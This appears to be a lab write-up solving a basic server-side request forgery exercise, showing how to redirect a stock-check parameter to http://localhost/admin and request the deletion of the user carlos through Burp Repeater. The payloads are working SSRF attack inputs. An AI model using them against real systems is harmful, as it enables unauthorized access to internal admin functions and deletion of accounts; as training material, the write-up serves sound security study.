### Lab: Basic SSRF against the local server

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

_____

Analysis and Exploit:

1. Test the "Check stock" function in **/product/stock**
    - POST request **/product/stock** 
    - stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
2. **[BURP-REPEATER]** Repeat POST request from point 1
    - Change _stockAPI_ value to _http://localhost/admin_
3. **[BURP-REPEATER]** Repeat POST request from point 2
    - Change _stockAPI_ value to _http://localhost/admin/delete?username=carlos_

_____

Script:
1. Delete user | POST **/product/stock** | params: stockAPI
    - stockAPI : http://localhost/admin/delete?username=carlos
        - if status code = 401 Unauthorized, then ok